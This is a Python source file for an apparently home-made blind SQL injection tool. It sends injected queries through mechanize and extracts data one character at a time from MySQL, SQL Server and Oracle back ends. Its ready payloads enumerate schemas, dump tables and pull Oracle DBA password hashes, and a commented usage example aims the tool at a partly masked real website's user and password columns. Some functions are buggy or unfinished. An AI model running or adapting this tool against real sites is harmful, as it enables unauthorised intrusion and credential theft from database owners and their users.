#!/usr/bin/python
# -*- coding: utf-8 -*-
# sha0@badchecksum.net

#b = BlindMySQL()
#b.form = 'formuB'
#b.badguy = '0 Resultados'
#b.goodguy = 'hay resultados'
#b.outfile = 'out'
#b.post = 1
#b.param = 'busca'
#b.url = 'http://www.oxxx.org/alimentacion'
#b.getDatabases()
#b.getTables('database')
#b.getColumns('database','table')
#b.getData('database','table','user')
#b.getDataFiltered('database','table','user','admin','password')


'''
               Wordlist
                  |
               BlindSQL 
                  |
       -----------+----------------
       |          |               |
 BlindMySQL  BlindOracle    BlindMSSSQL

'''


__version__ = "$Revision: 0004000 $"

from util.wordlist import *
from mechanize import Browser
import re, sys


'''
	CORE
'''

class BlindSQL(Wordlist):			#def 
	def __init__(self):
		Wordlist.__init__(self)
		self.b = Browser()
		self.b.set_handle_robots(False)
		self.r_x = re.compile('X')
		self.r_p = re.compile('%')
		self.r_pattern = re.compile('#([^#]+)#')
		#Configuration:
		self.goodguy=''
		self.badguy=''
		self.post = 0
		self.query=''
		self.form=''
		self.outfile=''
		self.param = ''
		self.debug=False
		self.other = {}
		self.url = ''
		self.extracted = []
		#Preapare Wordlist
		self.clear()
		self.mins(1)
		self.nums(9)
		self.words.append('$')
		self.words.append('-')
		self.words.append('\_')
		self.result = ''
		#self.words.append('_') 
		
		'''
		problematica del byte _ en el retroceso, un nombre de columna puede contener este byte,
		pero también es un comodín, con lo que al hacer el retroceso, todas las queries daran true, 
		de manera que abran muchos falsos positivos. 
		'''
		
	def show(self):
		print "-----------------"
		print self.query
		print "Values:"
		for e in self.extracted:
			print e
			
	def setDebug(self,value):
		self.debug=value

	def _launch(self,query):	
		try:
			if self.post:
				self.b.open(self.url)
      				self.b.select_form(self.form)
      				self.b[self.param] = query
				for k in self.other.keys():
					self.b[k] = self.other[k]
      	 			r = self.b.submit()
			else:
				if self.debug:
					print self.url+self.encode(query)
				r = self.b.open(self.url+self.encode(query))
			return r.read()
		except:
			return ''
		
	def isSuccess(self,out):
		if len(self.badguy)+len(self.goodguy) == 0:
			print "You must select goodguy o bien badguy"
			sys.exit(1)
			
		if re.compile(self.goodguy).findall(out) or not re.compile(self.badguy).findall(out):
			return True

		return False

	def num(self):
		for n in self.words:
			query = self.r_x.sub(n,self.query)
			html = self._launch(query)
			#print query
			if not self.isSuccess(html):
			 	return
	
	def getData(self,table,column):	
		self.query = "'and'1'in(select'1'from "+table+" where "+column+" like 'X%')or'1'='2"
		self.blind()
		self.show()

	def encode(self,data):
		data = data.replace('%','%25')
		data = data.replace(' ','+')
		data = data.replace('(','%28')
		data = data.replace(')','%29')
		data = data.replace('\'','%27')
		data = data.replace('"','%22')
		return data
		
		
		'''
			Optimizaciones	
				- like: letas frecuentes primero
				- dicotomica				
		'''

	def blind(self, pos=1, init='a', end='z'):
		
			
		middle = ord(init)+((ord(end)-ord(init))/2)	
		column = self.r_pattern.findall(self.query)[0]
		
		if ord(end)-ord(init) == 0:
			query = self.r_pattern.sub("ASCII(SUBSTRING((%s), %d, 1)) = %d" % (column,pos,middle), self.query)
			if self.debug:
				print query+' '+chr(middle)
			html = self._launch(query)
		
			if self.isSuccess(html):
				self.result += chr(middle)   
				print self.result
				pos += 1
				self.blind(pos)
				return
			else:
				if pos == 0:
					print "No elements"
					return
				else:
					print "Word found: "
					return

		query = self.r_pattern.sub("ASCII(SUBSTRING(('%s'), '%d', 1)) >= %d" % (column,pos,middle), self.query)
		html = self._launch(query)
		
		if self.isSuccess(html):
			if self.debug:
				print query+' '+chr(middle)+' upper'
			print "(%s-%s)    >= %s ? -> True" % (init,end,chr(middle))
			self.blind(pos,chr(middle),end)
		else:
			if self.debug:
				print query+' '+chr(middle)+' lower'
			print "(%s-%s)    >= %s ? ->False" % (init,end,chr(middle))
			self.blind(pos,init,chr(middle))
			#prefix = self.blind(prefix)
















'''
	MySQL
'''

class BlindMySQL(BlindSQL):				#def
	def __init__(self):
		BlindSQL.__init__(self)
		self.silent = False
		self.start = "'or 0 < ("
		self.terminator = ") or '1'='2"
	
	def getDatabases(self): #TODO: hacer con scemata en vez de TABLES
		self.query = "%s select count(1) from information_schema.TABLES where table_schema like 'X%%' %s" % (self.start, self.terminator)
		#self.query = "'and'1'in(select'1'from information_schema.schemata where schema_name like 'X%')or'1'='2"
		self.blind()
		if not self.silent:
			self.show()
	
	def getTables(self,database):
		self.query = "%s select count(1) from information_schema.TABLES where #table_name# and table_schema = '%s' %s" % (self.start, database, self.terminator)
		self.blind()
		if not self.silent:
			self.show()

	def getColumns(self,database,table):
		self.query = "%s select count(1) from information_schema.COLUMNS where column_name like 'X%%' and table_schema = '%s' and table_name = '%s' %s" % (self.start, database, table, self.terminator)
		self.blind()
		if not self.silent:
			self.show()

	def getData(self,database,table,column):
		self.query = "%s select count(1) from  %s.%s where %s like 'X%%' %s" % (self.start,database,table,column,self.terminator)
		self.blind()
		if not self.silent:
			self.show()	
			
	def getDataFiltered(self,database,table,column_filter,value_filter,column):
		self.query = "%s select count(1) from  %s.%s where %s='%s' and %s like 'X%%' %s" % (self.start,database,table,column_filter,value_filter,column,self.terminator)
		self.blind()
		if not self.silent:
			self.show()	
		
	def isRoot(self):
		query = "%s select count(1) from mysql.USER limit 1 %s" % (self.start, self.terminator)
		html = self._launch(query)
		if self.isSuccess(html):
			return True
		return False
		#TODO
		
	def getFile(self,filename):
		if self.isRoot():  	#TODO
			print "File:"			
		else:
			print "You are not root"

	def writeFile(self,filename,content):
		pass #TODO
	
	def dumpTable(self,database,table):
		self.silent = True
		self.getColumns(database,table)
		columns = self.extracted 
		print "Columns:"
		for c in columns:
			print "\t%s" % c
		
		
		if len(columns) == 1: 
			self.show()
			return
				
		
		sys.stdout.write('Select index => ')
		idx_title = sys.stdin.readline()[:-1]	
		
		self.getData(database,table,idx_title)
		indexes = self.extracted
		print "-------------------------------------------------------"
		print "			%s.%s:" % (database,table)
		print "-------------------------------------------------------"
		for column in columns:
			sys.stdout.write(column+'\t\t')
		print "\n-------------------------------------------------------"
		
		for column in columns:
			for idx_value in indexes:
				if column != idx_title:
					self.getDataFiltered(database,table,idx_title,idx_value,column)
					for e in self.extracted:
						sys.stdout.write(e+'\t\t')
					print ""
					


	def dump(self): # too heavy, use only on small databases TODO: arreglar output
		self.getDatabases();
		databases = self.extracted
		for database in databases:
			self.getTables(database)
			tables = self.extracted
			for table in tables:
				print "--- %s.%s: ---" % (database,table)
				self.getColumns(database,table)
				columns = self.extracted 
				
				self.getData(database,table,column[0])
				indexes = self.extracted
				
				if len(columns) == 1: 
					self.show()
					return
						
				for idx in indexes:
					for column in colunmns[1:]:
						self.getDataFiltered(database,table,column[0],idx,column)
						for e in self.extracted:
 							print "%s) %s=%s" % (idx,column,database,e)
					
					
					
					
					
					
					
					
					
					
'''
	Microsoft SQL Server
'''
					
					

class BlindSQLServer(BlindSQL):		#def 
	def __init__(self):
		BlindSQL.__init__(self)

	def getDatabases(self):
		self.query = "'or'1'in(select'1'from sys.sysdatabases where name like 'X%')or'1'='2"
		self.blind()
		self.show()

	def getTables(self):
		self.query = "'or'1'in(select'1'from sys.sysobjects where xtype='u' and name like 'X%')or'1'='2"
		self.blind()
		self.show()

	def getColumns(self,table):
		self.query = "'or'1'in(select'1'from sys.syscolumns as c,sys.sysobjects as o where c.id=o.id and o.name='"+table+"' and c.name like 'X%')or'1'='2"
		self.blind()
		self.show()

	def getData(self,table,column):	
		self.query = "'or'1'in(select'1'from "+table+" where "+column+" like 'X%')or'1'='2"
		self.blind()
		self.show()








'''
	Oracle
'''


class BlindOracle(BlindSQL):
	def __init__(self):
		BlindSQL.__init__(self)

	def getUsersDBA(self):
		self.query = "1'and'1'in(select'1'from dba_users where username like 'X%')or'1'='2"
		self.blind()
		self.show()

	def getPassword(self,user):
		self.query = "1'and'1'in(select'1'from dba_users where username = '"+user+"' and password like 'X%')or'1'='2"
		self.blind()
		self.show()

	def getUsers(self):
		self.query = "1'and'1'in(select'1'from all_users where username like 'X%')or'1'='2"
		self.blind()
		self.show()

	def getTables(self):
		self.query = "1'and'1'in(select'1'from all_tables where #table_name )or'1'='2"
		self.blind()
		self.show()
	
	def getUserTables(self):
		self.query = "1'and'1'in(select'1'from user_tables where table_name like 'X%')or'1'='2"
		self.blind()
		self.show()

	def getTablespace(self,table):
		self.query = "1'and'1'in(select'1'from all_tables where table_name = '"+table+"' and tablespace_name like 'X%')or'1'='2"
		self.blind()
		self.show()

	def getColumns(self,table):
		self.query = "1'and'1'in(select'1'from all_tab_columns where table_name = '"+table+"' and column_name like 'X%')or'1'='2"
		self.blind()
		self.show()

	def getData(self,table,column,cond=None):
		if cond:
			self.query = "1'and'1'in(select'1'from "+table+" where "+column+" like 'X%' and "+cond+")or'1'='2"
		else:
			self.query = "1'and'1'in(select'1'from "+table+" where "+column+" like 'X%')or'1'='2"
		self.blind()
		self.show()

